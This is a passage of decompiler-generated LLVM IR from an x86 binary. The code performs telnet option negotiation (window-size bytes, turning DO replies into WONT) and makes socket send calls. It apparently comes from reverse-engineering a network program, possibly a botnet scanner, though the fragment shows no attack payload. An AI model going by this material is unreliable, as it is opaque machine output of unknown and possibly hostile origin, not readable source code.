  %v1_805060e = phi i32 [ %v1_805061e, %dec_label_pc_8050a18 ], [ %v3_8050e73, %dec_label_pc_8050e3a ]
  %v0_805060e = phi i32 [ %v1_8050a1b, %dec_label_pc_8050a18 ], [ %v0_805060e.pre, %dec_label_pc_8050e3a ]
  %v5_8050624109 = phi i32 [ %v7_8050624, %dec_label_pc_8050a18 ], [ %v0_8050e6b, %dec_label_pc_8050e3a ]
  %v0_8050617104 = phi i32 [ %v0_8050a30, %dec_label_pc_8050a18 ], [ %v1_8050e70, %dec_label_pc_8050e3a ]
  %v2_805060e = sub i32 %v0_805060e, %v1_805060e
  %v8_805060e = xor i32 %v0_805060e, %v1_805060e
  %v9_805060e = xor i32 %v2_805060e, %v0_805060e
  %v10_805060e = and i32 %v9_805060e, %v8_805060e
  %v11_805060e = icmp slt i32 %v10_805060e, 0
  %v13_805060e = icmp slt i32 %v2_805060e, 0
  %v2_8050610 = icmp eq i1 %v13_805060e, %v11_805060e
  br i1 %v2_8050610, label %dec_label_pc_8050684, label %dec_label_pc_8050612.preheader

dec_label_pc_8050a23:                             ; preds = %dec_label_pc_8050c92, %dec_label_pc_8050966, %dec_label_pc_80508a4, %dec_label_pc_8050c19, %dec_label_pc_8050d0b, %dec_label_pc_8050bc7, %dec_label_pc_8050b76, %dec_label_pc_8050684, %dec_label_pc_8050d84
  %v0_8050a23 = phi i32 [ %v1_8050c86, %dec_label_pc_8050c92 ], [ %v1_805095a160, %dec_label_pc_8050966 ], [ %v0_805089b, %dec_label_pc_80508a4 ], [ %v1_8050c0d, %dec_label_pc_8050c19 ], [ %v1_8050cff, %dec_label_pc_8050d0b ], [ %v0_8050bc7, %dec_label_pc_8050bc7 ], [ %v0_8050b76, %dec_label_pc_8050b76 ], [ %v0_8050684, %dec_label_pc_8050684 ], [ %v1_8050d78, %dec_label_pc_8050d84 ]
  %v1_8050a23 = icmp eq i32 %v0_8050a23, 0
  %v1_8050a25 = icmp eq i1 %v1_8050a23, false
  br i1 %v1_8050a25, label %dec_label_pc_80508f1, label %dec_label_pc_8050583.loopexit12.loopexit

dec_label_pc_8050a30:                             ; preds = %dec_label_pc_805062f
  %v1_8050a30 = add i32 %v0_8050a30, 1879
  %v2_8050a30 = inttoptr i32 %v1_8050a30 to i8*
  store i8 -1, i8* %v2_8050a30, align 1
  %v0_8050a38 = load i32, i32* @esp, align 4
  %v1_8050a38 = add i32 %v0_8050a38, 1880
  %v2_8050a38 = inttoptr i32 %v1_8050a38 to i8*
  store i8 -5, i8* %v2_8050a38, align 1
  %v0_8050a40 = load i32, i32* @esp, align 4
  %v1_8050a40 = add i32 %v0_8050a40, 1881
  %v2_8050a40 = inttoptr i32 %v1_8050a40 to i8*
  store i8 31, i8* %v2_8050a40, align 1
  %v0_8050a48 = load i32, i32* @esp, align 4
  %v1_8050a48 = add i32 %v0_8050a48, 1847
  %v2_8050a48 = inttoptr i32 %v1_8050a48 to i8*
  store i8 -1, i8* %v2_8050a48, align 1
  %v0_8050a50 = load i32, i32* @esp, align 4
  %v1_8050a50 = add i32 %v0_8050a50, 1848
  %v2_8050a50 = inttoptr i32 %v1_8050a50 to i8*
  store i8 -6, i8* %v2_8050a50, align 1
  %v0_8050a58 = load i32, i32* @esp, align 4
  %v1_8050a58 = add i32 %v0_8050a58, 1849
  %v2_8050a58 = inttoptr i32 %v1_8050a58 to i8*
  store i8 31, i8* %v2_8050a58, align 1
  %v0_8050a60 = load i32, i32* @esp, align 4
  %v1_8050a60 = add i32 %v0_8050a60, 1850
  %v2_8050a60 = inttoptr i32 %v1_8050a60 to i8*
  store i8 0, i8* %v2_8050a60, align 1
  %v0_8050a68 = load i32, i32* @esp, align 4
  %v1_8050a68 = add i32 %v0_8050a68, 1851
  %v2_8050a68 = inttoptr i32 %v1_8050a68 to i8*
  store i8 80, i8* %v2_8050a68, align 1
  %v0_8050a70 = load i32, i32* @esp, align 4
  %v1_8050a70 = add i32 %v0_8050a70, 1852
  %v2_8050a70 = inttoptr i32 %v1_8050a70 to i8*
  store i8 0, i8* %v2_8050a70, align 1
  %v0_8050a78 = load i32, i32* @esp, align 4
  %v1_8050a78 = add i32 %v0_8050a78, 1853
  %v2_8050a78 = inttoptr i32 %v1_8050a78 to i8*
  store i8 24, i8* %v2_8050a78, align 1
  %v0_8050a80 = load i32, i32* @esp, align 4
  %v1_8050a80 = add i32 %v0_8050a80, 1854
  %v2_8050a80 = inttoptr i32 %v1_8050a80 to i8*
  store i8 -1, i8* %v2_8050a80, align 1
  %v0_8050a88 = load i32, i32* @esp, align 4
  %v1_8050a88 = add i32 %v0_8050a88, 1855
  %v2_8050a88 = inttoptr i32 %v1_8050a88 to i8*
  store i8 -16, i8* %v2_8050a88, align 1
  %v0_8050a90 = load i32, i32* @esp, align 4
  %v1_8050a90 = add i32 %v0_8050a90, 16
  %v2_8050a90 = inttoptr i32 %v1_8050a90 to i32*
  %v3_8050a90 = load i32, i32* %v2_8050a90, align 4
  store i32 %v3_8050a90, i32* %eax.global-to-local, align 4
  %v0_8050a94 = load i32, i32* @edi, align 4
  %v1_8050a94 = add i32 %v0_8050a94, 24
  %v2_8050a94 = inttoptr i32 %v1_8050a94 to i32*
  %v3_8050a94 = load i32, i32* %v2_8050a94, align 4
  store i32 %v3_8050a94, i32* %ecx.global-to-local, align 4
  %v0_8050a97 = load i32, i32* @ebx, align 4
  %v1_8050a97 = add i32 %v0_8050a97, 2
  store i32 %v1_8050a97, i32* %edx.global-to-local, align 4
  %v2_8050a9a = add i32 %v3_8050a94, %v3_8050a90
  store i32 %v2_8050a9a, i32* %eax.global-to-local, align 4
  %tmp299 = icmp ugt i32 %v2_8050a9a, %v1_8050a97
  br i1 %tmp299, label %dec_label_pc_8050aa4, label %dec_label_pc_8050a30.dec_label_pc_8050684.loopexit_crit_edge

dec_label_pc_8050a30.dec_label_pc_8050684.loopexit_crit_edge: ; preds = %dec_label_pc_8050a30
  %v0_8050684.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8050684

dec_label_pc_8050aa4:                             ; preds = %dec_label_pc_8050a30
  %v2_8050aa4 = inttoptr i32 %v1_8050a97 to i8*
  %v3_8050aa4 = load i8, i8* %v2_8050aa4, align 1
  %v12_8050aa4 = icmp eq i8 %v3_8050aa4, 31
  br i1 %v12_8050aa4, label %dec_label_pc_8050e3a, label %dec_label_pc_8050aae

dec_label_pc_8050aae:                             ; preds = %dec_label_pc_8050aa4
  %v1_8050aae = inttoptr i32 %v0_8050a97 to i8*
  %v2_8050aae = load i8, i8* %v1_8050aae, align 1
  %v3_8050aae = zext i8 %v2_8050aae to i32
  %v5_8050aae = and i32 %v2_8050a9a, -256
  %v6_8050aae = or i32 %v3_8050aae, %v5_8050aae
  store i32 %v6_8050aae, i32* %eax.global-to-local, align 4
  %v11_8050ab0 = icmp eq i8 %v2_8050aae, -3
  %v1_8050ab2 = icmp eq i1 %v11_8050ab0, false
  br i1 %v1_8050ab2, label %dec_label_pc_8051003, label %dec_label_pc_8050ab8

dec_label_pc_8050ab8:                             ; preds = %dec_label_pc_8050aae
  store i8 -4, i8* %v1_8050aae, align 1
  %v0_8050abb = load i32, i32* @esi, align 4
  %v1_8050abb = inttoptr i32 %v0_8050abb to i8*
  %v2_8050abb = load i8, i8* %v1_8050abb, align 1
  %v3_8050abb = zext i8 %v2_8050abb to i32
  %v4_8050abb = load i32, i32* %eax.global-to-local, align 4
  %v5_8050abb = and i32 %v4_8050abb, -256
  %v6_8050abb = or i32 %v5_8050abb, %v3_8050abb
  store i32 %v6_8050abb, i32* %eax.global-to-local, align 4
  %v11_8050abd = icmp eq i8 %v2_8050abb, -3
  %v1_8050abf = icmp eq i1 %v11_8050abd, false
  br i1 %v1_8050abf, label %dec_label_pc_8050648, label %dec_label_pc_8050ac5

dec_label_pc_8050ac5:                             ; preds = %dec_label_pc_8050ab8, %dec_label_pc_805063e
  %v0_8050ac5 = phi i32 [ %v0_8050abb, %dec_label_pc_8050ab8 ], [ %v0_805063e, %dec_label_pc_805063e ]
  %v1_8050ac5 = inttoptr i32 %v0_8050ac5 to i8*
  store i8 -4, i8* %v1_8050ac5, align 1
  %v0_8050ac8 = load i32, i32* @ebx, align 4
  %v1_8050ac8 = add i32 %v0_8050ac8, 2
  %v2_8050ac8 = inttoptr i32 %v1_8050ac8 to i8*
  %v3_8050ac8 = load i8, i8* %v2_8050ac8, align 1
  %v4_8050ac8 = zext i8 %v3_8050ac8 to i32
  %v5_8050ac8 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050ac8 = and i32 %v5_8050ac8, -256
  %v7_8050ac8 = or i32 %v6_8050ac8, %v4_8050ac8
  store i32 %v7_8050ac8, i32* %eax.global-to-local, align 4
  %v11_8050acb = icmp eq i8 %v3_8050ac8, -3
  %v1_8050acd = icmp eq i1 %v11_8050acb, false
  br i1 %v1_8050acd, label %dec_label_pc_805065b, label %dec_label_pc_8050ad3

dec_label_pc_8050ad3:                             ; preds = %dec_label_pc_8050ac5, %dec_label_pc_8050650
  %v0_8050ad3 = phi i32 [ %v0_8050ac8, %dec_label_pc_8050ac5 ], [ %v0_8050650, %dec_label_pc_8050650 ]
  %v1_8050ad3 = add i32 %v0_8050ad3, 2
  %v2_8050ad3 = inttoptr i32 %v1_8050ad3 to i8*
  store i8 -4, i8* %v2_8050ad3, align 1
  br label %dec_label_pc_8050663

dec_label_pc_8050adc:                             ; preds = %dec_label_pc_805059e
  %v1_80505cb = icmp eq i32 %v0_80505c3, 0
  br i1 %v1_80505cb, label %dec_label_pc_8050fe8, label %dec_label_pc_8050ae2

dec_label_pc_8050ae2:                             ; preds = %dec_label_pc_8050adc
  %v10_8050ae2 = icmp eq i32 %v0_80505c3, -1
  %v1_8050ae5 = icmp eq i1 %v10_8050ae2, false
  br i1 %v1_8050ae5, label %dec_label_pc_80505e5, label %dec_label_pc_8050aeb

dec_label_pc_8050aeb:                             ; preds = %dec_label_pc_8050ae2
  %v1_8050aeb = add i32 %v0_80505c8, 56
  %v2_8050aeb = inttoptr i32 %v1_8050aeb to i32*
  %v3_8050aeb = load i32, i32* %v2_8050aeb, align 4
  store i32 %v3_8050aeb, i32* %edx.global-to-local, align 4
  %v1_8050aef = inttoptr i32 %v3_8050aeb to i32*
  %v2_8050aef = load i32, i32* %v1_8050aef, align 4
  %v11_8050aef = icmp eq i32 %v2_8050aef, 11
  br i1 %v11_8050aef, label %dec_label_pc_805052e, label %dec_label_pc_8050af8

dec_label_pc_8050af8:                             ; preds = %dec_label_pc_8050aeb, %dec_label_pc_8050fe8
  %v0_8050af8 = phi i32 [ %v1_80505c8, %dec_label_pc_8050aeb ], [ %v0_8050af8.pre, %dec_label_pc_8050fe8 ]
  %v0_8050afb = load i32, i32* @edi, align 4
  %v1_8050afb = add i32 %v0_8050afb, 4
  %v2_8050afb = inttoptr i32 %v1_8050afb to i32*
  %v3_8050afb = load i32, i32* %v2_8050afb, align 4
  store i32 %v3_8050afb, i32* @esi, align 4
  %v2_8050afe = add i32 %v0_8050af8, -16
  %v3_8050afe = inttoptr i32 %v2_8050afe to i32*
  store i32 %v3_8050afb, i32* %v3_8050afe, align 4
  %v1_8050aff = call i32 @function_8052191(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050aff, i32* %eax.global-to-local, align 4
  %v0_8050b04 = load i32, i32* @edi, align 4
  %v1_8050b04 = add i32 %v0_8050b04, 284
  %v2_8050b04 = inttoptr i32 %v1_8050b04 to i8*
  %v3_8050b04 = load i8, i8* %v2_8050b04, align 1
  %v4_8050b04 = zext i8 %v3_8050b04 to i32
  %v6_8050b04 = and i32 %v1_8050aff, -256
  %v7_8050b04 = or i32 %v4_8050b04, %v6_8050b04
  %v1_8050b0d = add i32 %v7_8050b04, 1
  store i32 %v1_8050b0d, i32* %eax.global-to-local, align 4
  %v1_8050b0e = add i32 %v0_8050b04, 4
  %v2_8050b0e = inttoptr i32 %v1_8050b0e to i32*
  store i32 -1, i32* %v2_8050b0e, align 4
  %v0_8050b15 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b15 = trunc i32 %v0_8050b15 to i8
  %v2_8050b15 = load i32, i32* @edi, align 4
  %v3_8050b15 = add i32 %v2_8050b15, 284
  %v4_8050b15 = inttoptr i32 %v3_8050b15 to i8*
  store i8 %v1_8050b15, i8* %v4_8050b15, align 1
  %v0_8050b1b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b1b = trunc i32 %v0_8050b1b to i8
  %tmp300 = icmp ult i8 %v1_8050b1b, 10
  %v0_8050ff7 = load i32, i32* @edi, align 4
  br i1 %tmp300, label %dec_label_pc_8050ff7, label %dec_label_pc_8050b23

dec_label_pc_8050b23:                             ; preds = %dec_label_pc_8050af8
  %v1_8050b23 = add i32 %v0_8050ff7, 284
  %v2_8050b23 = inttoptr i32 %v1_8050b23 to i8*
  store i8 0, i8* %v2_8050b23, align 1
  %v0_8050b2a = load i32, i32* @edi, align 4
  %v1_8050b2a = add i32 %v0_8050b2a, 12
  %v2_8050b2a = inttoptr i32 %v1_8050b2a to i32*
  store i32 0, i32* %v2_8050b2a, align 4
  br label %dec_label_pc_805052e

dec_label_pc_8050b36:                             ; preds = %dec_label_pc_8050648
  %v1_8050b36 = inttoptr i32 %v0_8050b36 to i8*
  store i8 -3, i8* %v1_8050b36, align 1
  %v5_8050650.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050650

dec_label_pc_8050b3e:                             ; preds = %dec_label_pc_805065b
  %v1_8050b3e = add i32 %v0_8050b3e, 2
  %v2_8050b3e = inttoptr i32 %v1_8050b3e to i8*
  store i8 -3, i8* %v2_8050b3e, align 1
  br label %dec_label_pc_8050663

dec_label_pc_8050b47:                             ; preds = %dec_label_pc_805058a
  %v0_8050b47 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050b47, i32* %edx.global-to-local, align 4
  %v1_8050b49 = load i32, i32* @esp, align 4
  %v2_8050b49 = add i32 %v1_8050b49, -4
  %v3_8050b49 = inttoptr i32 %v2_8050b49 to i32*
  store i32 %v0_8050b47, i32* %v3_8050b49, align 4
  %v0_8050b4a = load i32, i32* @edi, align 4
  %v1_8050b4a = add i32 %v0_8050b4a, 92
  store i32 %v1_8050b4a, i32* %eax.global-to-local, align 4
  %v1_8050b4d = add i32 %v1_8050b49, -8
  %v2_8050b4d = inttoptr i32 %v1_8050b4d to i32*
  store i32 192, i32* %v2_8050b4d, align 4
  %v0_8050b52 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b52 = add i32 %v1_8050b49, -12
  %v3_8050b52 = inttoptr i32 %v2_8050b52 to i32*
  store i32 %v0_8050b52, i32* %v3_8050b52, align 4
  %v0_8050b53 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050b53 = add i32 %v1_8050b49, -16
  %v3_8050b53 = inttoptr i32 %v2_8050b53 to i32*
  store i32 %v0_8050b53, i32* %v3_8050b53, align 4
  %v4_8050b54 = call i32 @function_80526f3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050b54, i32* %eax.global-to-local, align 4
  %v0_8050b59 = load i32, i32* @edi, align 4
  %v1_8050b59 = add i32 %v0_8050b59, 24
  %v2_8050b59 = inttoptr i32 %v1_8050b59 to i32*
  %v3_8050b59 = load i32, i32* %v2_8050b59, align 4
  %v1_8050b5c = add i32 %v3_8050b59, -64
  store i32 %v1_8050b5c, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b5c, i32* %v2_8050b59, align 4
  br label %dec_label_pc_805059e

dec_label_pc_8050b6a:                             ; preds = %dec_label_pc_80506ca, %dec_label_pc_80506c1, %dec_label_pc_80506b8, %dec_label_pc_80506af, %dec_label_pc_80506a2
  %v1_8050b6a = add i32 %v0_8050b6a, 1
  store i32 %v1_8050b6a, i32* @ebp, align 4
  %v10_8050b6d = icmp eq i32 %v0_8050b6a, -2
  br i1 %v10_8050b6d, label %dec_label_pc_80506d6, label %dec_label_pc_8050b76

dec_label_pc_8050b76:                             ; preds = %dec_label_pc_8050b6a, %dec_label_pc_80506f6, %dec_label_pc_80506d6
  %v0_8050b76 = phi i32 [ %v1_8050b6a, %dec_label_pc_8050b6a ], [ %v0_8050706, %dec_label_pc_80506f6 ], [ %v0_80506e3, %dec_label_pc_80506d6 ]
  %tmp148 = icmp slt i32 %v0_8050b76, 1
  br i1 %tmp148, label %dec_label_pc_8050a23, label %dec_label_pc_8050b7e

dec_label_pc_8050b7e:                             ; preds = %dec_label_pc_8050b76
  %v0_8050b7e = load i32, i32* @edi, align 4
  %v1_8050b7e = inttoptr i32 %v0_8050b7e to i32*
  %v2_8050b7e = load i32, i32* %v1_8050b7e, align 4
  store i32 %v2_8050b7e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050b82 = load i32, i32* @esp, align 4
  %v1_8050b82 = add i32 %v0_8050b82, -4
  %v2_8050b82 = inttoptr i32 %v1_8050b82 to i32*
  store i32 16384, i32* %v2_8050b82, align 4
  %v0_8050b87 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b87 = add i32 %v0_8050b87, 12
  %v2_8050b87 = inttoptr i32 %v1_8050b87 to i8*
  %v3_8050b87 = load i8, i8* %v2_8050b87, align 1
  %v4_8050b87 = zext i8 %v3_8050b87 to i32
  %v5_8050b87 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050b87 = and i32 %v5_8050b87, -256
  %v7_8050b87 = or i32 %v6_8050b87, %v4_8050b87
  store i32 %v7_8050b87, i32* %eax.global-to-local, align 4
  %v2_8050b8a = add i32 %v0_8050b82, -8
  %v3_8050b8a = inttoptr i32 %v2_8050b8a to i32*
  store i32 %v7_8050b87, i32* %v3_8050b8a, align 4
  %v0_8050b8b = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b8b = inttoptr i32 %v0_8050b8b to i32*
  %v2_8050b8b = load i32, i32* %v1_8050b8b, align 4
  store i32 %v2_8050b8b, i32* %eax.global-to-local, align 4
  %v2_8050b8d = add i32 %v0_8050b82, -12
  %v3_8050b8d = inttoptr i32 %v2_8050b8d to i32*
  store i32 %v2_8050b8b, i32* %v3_8050b8d, align 4
  %v0_8050b8e = load i32, i32* @edi, align 4
  %v1_8050b8e = add i32 %v0_8050b8e, 4
  %v2_8050b8e = inttoptr i32 %v1_8050b8e to i32*
  %v3_8050b8e = load i32, i32* %v2_8050b8e, align 4
  store i32 %v3_8050b8e, i32* %eax.global-to-local, align 4
  %v2_8050b91 = add i32 %v0_8050b82, -16
  %v3_8050b91 = inttoptr i32 %v2_8050b91 to i32*
  store i32 %v3_8050b8e, i32* %v3_8050b91, align 4
  %v0_8050b92 = call i32 @function_80528d4()
  store i32 %v0_8050b92, i32* %eax.global-to-local, align 4
  %v0_8050b97 = load i32, i32* @esp, align 4
  %v1_8050b97 = add i32 %v0_8050b97, -4
  %v2_8050b97 = inttoptr i32 %v1_8050b97 to i32*
  store i32 16384, i32* %v2_8050b97, align 4
  %v1_8050b9c = add i32 %v0_8050b97, -8
  %v2_8050b9c = inttoptr i32 %v1_8050b9c to i32*
  store i32 2, i32* %v2_8050b9c, align 4
  %v1_8050b9e = add i32 %v0_8050b97, -12
  %v2_8050b9e = inttoptr i32 %v1_8050b9e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_8050b9e, align 4
  %v0_8050ba3 = load i32, i32* @edi, align 4
  %v1_8050ba3 = add i32 %v0_8050ba3, 4
  %v2_8050ba3 = inttoptr i32 %v1_8050ba3 to i32*
  %v3_8050ba3 = load i32, i32* %v2_8050ba3, align 4
  store i32 %v3_8050ba3, i32* %eax.global-to-local, align 4
  %v2_8050ba6 = add i32 %v0_8050b97, -16
  %v3_8050ba6 = inttoptr i32 %v2_8050ba6 to i32*
  store i32 %v3_8050ba3, i32* %v3_8050ba6, align 4
  %v0_8050ba7 = call i32 @function_80528d4()
  store i32 %v0_8050ba7, i32* %eax.global-to-local, align 4
  %v0_8050baf = load i32, i32* @edi, align 4
  %v1_8050baf = add i32 %v0_8050baf, 12
  %v2_8050baf = inttoptr i32 %v1_8050baf to i32*
  store i32 4, i32* %v2_8050baf, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050bbb:                             ; preds = %dec_label_pc_8050749, %dec_label_pc_8050740, %dec_label_pc_8050737, %dec_label_pc_805072a
  %v1_8050bbb = add i32 %v0_8050bbb, 1
  store i32 %v1_8050bbb, i32* @ebp, align 4
  %v10_8050bbe = icmp eq i32 %v0_8050bbb, -2
  br i1 %v10_8050bbe, label %dec_label_pc_8050755, label %dec_label_pc_8050bc7

dec_label_pc_8050bc7:                             ; preds = %dec_label_pc_8050bbb, %dec_label_pc_8050755
  %v0_8050bc7 = phi i32 [ %v1_8050bbb, %dec_label_pc_8050bbb ], [ %v0_8050762, %dec_label_pc_8050755 ]
  %tmp149 = icmp slt i32 %v0_8050bc7, 1
  br i1 %tmp149, label %dec_label_pc_8050a23, label %dec_label_pc_8050bcf

dec_label_pc_8050bcf:                             ; preds = %dec_label_pc_8050bc7
  %v0_8050bcf = load i32, i32* @edi, align 4
  %v1_8050bcf = inttoptr i32 %v0_8050bcf to i32*
  %v2_8050bcf = load i32, i32* %v1_8050bcf, align 4
  store i32 %v2_8050bcf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050bd3 = load i32, i32* @esp, align 4
  %v1_8050bd3 = add i32 %v0_8050bd3, -4
  %v2_8050bd3 = inttoptr i32 %v1_8050bd3 to i32*
  store i32 16384, i32* %v2_8050bd3, align 4
  %v0_8050bd8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050bd8 = add i32 %v0_8050bd8, 13
  %v2_8050bd8 = inttoptr i32 %v1_8050bd8 to i8*
  %v3_8050bd8 = load i8, i8* %v2_8050bd8, align 1
  %v4_8050bd8 = zext i8 %v3_8050bd8 to i32
  %v5_8050bd8 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050bd8 = and i32 %v5_8050bd8, -256
  %v7_8050bd8 = or i32 %v6_8050bd8, %v4_8050bd8
  store i32 %v7_8050bd8, i32* %eax.global-to-local, align 4
  %v2_8050bdb = add i32 %v0_8050bd3, -8
  %v3_8050bdb = inttoptr i32 %v2_8050bdb to i32*
  store i32 %v7_8050bd8, i32* %v3_8050bdb, align 4
  %v0_8050bdc = load i32, i32* %edx.global-to-local, align 4
  %v1_8050bdc = add i32 %v0_8050bdc, 4
  %v2_8050bdc = inttoptr i32 %v1_8050bdc to i32*
  %v3_8050bdc = load i32, i32* %v2_8050bdc, align 4
  store i32 %v3_8050bdc, i32* @esi, align 4
  %v2_8050bdf = add i32 %v0_8050bd3, -12
  %v3_8050bdf = inttoptr i32 %v2_8050bdf to i32*
  store i32 %v3_8050bdc, i32* %v3_8050bdf, align 4
  %v0_8050be0 = load i32, i32* @edi, align 4
  %v1_8050be0 = add i32 %v0_8050be0, 4
  %v2_8050be0 = inttoptr i32 %v1_8050be0 to i32*
  %v3_8050be0 = load i32, i32* %v2_8050be0, align 4
  store i32 %v3_8050be0, i32* @ebx, align 4
  %v2_8050be3 = add i32 %v0_8050bd3, -16
  %v3_8050be3 = inttoptr i32 %v2_8050be3 to i32*
  store i32 %v3_8050be0, i32* %v3_8050be3, align 4
  %v0_8050be4 = call i32 @function_80528d4()
  store i32 %v0_8050be4, i32* %eax.global-to-local, align 4
  %v0_8050be9 = load i32, i32* @esp, align 4
  %v1_8050be9 = add i32 %v0_8050be9, -4
  %v2_8050be9 = inttoptr i32 %v1_8050be9 to i32*
  store i32 16384, i32* %v2_8050be9, align 4
  %v1_8050bee = add i32 %v0_8050be9, -8
  %v2_8050bee = inttoptr i32 %v1_8050bee to i32*
  store i32 2, i32* %v2_8050bee, align 4
  %v1_8050bf0 = add i32 %v0_8050be9, -12
  %v2_8050bf0 = inttoptr i32 %v1_8050bf0 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_8050bf0, align 4
  %v0_8050bf5 = load i32, i32* @edi, align 4
  %v1_8050bf5 = add i32 %v0_8050bf5, 4
  %v2_8050bf5 = inttoptr i32 %v1_8050bf5 to i32*
  %v3_8050bf5 = load i32, i32* %v2_8050bf5, align 4
  store i32 %v3_8050bf5, i32* %ecx.global-to-local, align 4
  %v2_8050bf8 = add i32 %v0_8050be9, -16
  %v3_8050bf8 = inttoptr i32 %v2_8050bf8 to i32*
  store i32 %v3_8050bf5, i32* %v3_8050bf8, align 4
  %v0_8050bf9 = call i32 @function_80528d4()
  store i32 %v0_8050bf9, i32* %eax.global-to-local, align 4
  %v0_8050c01 = load i32, i32* @edi, align 4
  %v1_8050c01 = add i32 %v0_8050c01, 12
  %v2_8050c01 = inttoptr i32 %v1_8050c01 to i32*
  store i32 5, i32* %v2_8050c01, align 4
  br label %dec_label_pc_80508f1

dec_label_pc_8050c0d:                             ; preds = %dec_label_pc_80507f9, %dec_label_pc_80507f0, %dec_label_pc_80507e7, %dec_label_pc_80507de, %dec_label_pc_80507d1
  %v1_8050c0d = add i32 %v0_8050c0d, 1
  store i32 %v1_8050c0d, i32* @ebp, align 4
  %v10_8050c10 = icmp eq i32 %v0_8050c0d, -2
  br i1 %v10_8050c10, label %dec_label_pc_8050583.loopexit12.loopexit, label %dec_label_pc_8050c19

dec_label_pc_8050c19:                             ; preds = %dec_label_pc_8050c0d
  %tmp150 = icmp slt i32 %v1_8050c0d, 1
  br i1 %tmp150, label %dec_label_pc_8050a23, label %dec_label_pc_8050c21

dec_label_pc_8050c21:                             ; preds = %dec_label_pc_8050c19
  %v0_8050c21 = load i32, i32* @esp, align 4
  %v1_8050c24 = add i32 %v0_8050c21, -16
  %v2_8050c24 = inttoptr i32 %v1_8050c24 to i32*
  store i32 22, i32* %v2_8050c24, align 4
  %v2_8050c26 = call i32 @function_80512a0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050c26, i32* %eax.global-to-local, align 4
  %v0_8050c2b = load i32, i32* @esp, align 4
  %v1_8050c2b = inttoptr i32 %v0_8050c2b to i32*
  %v2_8050c2b = load i32, i32* %v1_8050c2b, align 4
  store i32 %v2_8050c2b, i32* %eax.global-to-local, align 4
  %v3_8050c2b = add i32 %v0_8050c2b, 4
  %v1_8050c2c = inttoptr i32 %v3_8050c2b to i32*
  %v2_8050c2c = load i32, i32* %v1_8050c2c, align 4
  store i32 %v2_8050c2c, i32* %edx.global-to-local, align 4
  %v1_8050c2d = add i32 %v0_8050c2b, 1888
  store i32 %v1_8050c2d, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c2d, i32* %v1_8050c2c, align 4
  store i32 22, i32* %v1_8050c2b, align 4
  %v3_8050c37 = call i32 @function_80511f0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050c37, i32* %eax.global-to-local, align 4
  %v0_8050c3c = load i32, i32* @esp, align 4
  %v1_8050c3c = add i32 %v0_8050c3c, -4
  %v2_8050c3c = inttoptr i32 %v1_8050c3c to i32*
  store i32 16384, i32* %v2_8050c3c, align 4
  %v1_8050c41 = add i32 %v0_8050c3c, 1888
  %v2_8050c41 = inttoptr i32 %v1_8050c41 to i32*
  %v3_8050c41 = load i32, i32* %v2_8050c41, align 4
  store i32 %v3_8050c41, i32* @esi, align 4
  %v2_8050c48 = add i32 %v0_8050c3c, -8
  %v3_8050c48 = inttoptr i32 %v2_8050c48 to i32*
  store i32 %v3_8050c41, i32* %v3_8050c48, align 4
  %v2_8050c49 = add i32 %v0_8050c3c, -12
  %v3_8050c49 = inttoptr i32 %v2_8050c49 to i32*
  store i32 %v3_8050c37, i32* %v3_8050c49, align 4
  %v0_8050c4a = load i32, i32* @edi, align 4
  %v1_8050c4a = add i32 %v0_8050c4a, 4
  %v2_8050c4a = inttoptr i32 %v1_8050c4a to i32*
  %v3_8050c4a = load i32, i32* %v2_8050c4a, align 4
  store i32 %v3_8050c4a, i32* @ebx, align 4
  %v2_8050c4d = add i32 %v0_8050c3c, -16
  %v3_8050c4d = inttoptr i32 %v2_8050c4d to i32*
  store i32 %v3_8050c4a, i32* %v3_8050c4d, align 4
  %v0_8050c4e = call i32 @function_80528d4()
  store i32 %v0_8050c4e, i32* %eax.global-to-local, align 4
  %v0_8050c53 = load i32, i32* @esp, align 4
  %v1_8050c56 = add i32 %v0_8050c53, 28
  %v2_8050c56 = inttoptr i32 %v1_8050c56 to i32*
  store i32 16384, i32* %v2_8050c56, align 4
  %v1_8050c5b = add i32 %v0_8050c53, 24
  %v2_8050c5b = inttoptr i32 %v1_8050c5b to i32*
  store i32 2, i32* %v2_8050c5b, align 4
  %v1_8050c5d = add i32 %v0_8050c53, 20
  %v2_8050c5d = inttoptr i32 %v1_8050c5d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054ac6.10 to i32), i32* %v2_8050c5d, align 4
  %v0_8050c62 = load i32, i32* @edi, align 4
  %v1_8050c62 = add i32 %v0_8050c62, 4
  %v2_8050c62 = inttoptr i32 %v1_8050c62 to i32*
  %v3_8050c62 = load i32, i32* %v2_8050c62, align 4
  store i32 %v3_8050c62, i32* %ecx.global-to-local, align 4
  %v2_8050c65 = add i32 %v0_8050c53, 16
  %v3_8050c65 = inttoptr i32 %v2_8050c65 to i32*
  store i32 %v3_8050c62, i32* %v3_8050c65, align 4
  %v0_8050c66 = call i32 @function_80528d4()
  store i32 %v0_8050c66, i32* %eax.global-to-local, align 4
  %v0_8050c6b = load i32, i32* @esp, align 4
  %v1_8050c6b = inttoptr i32 %v0_8050c6b to i32*
  store i32 22, i32* %v1_8050c6b, align 4
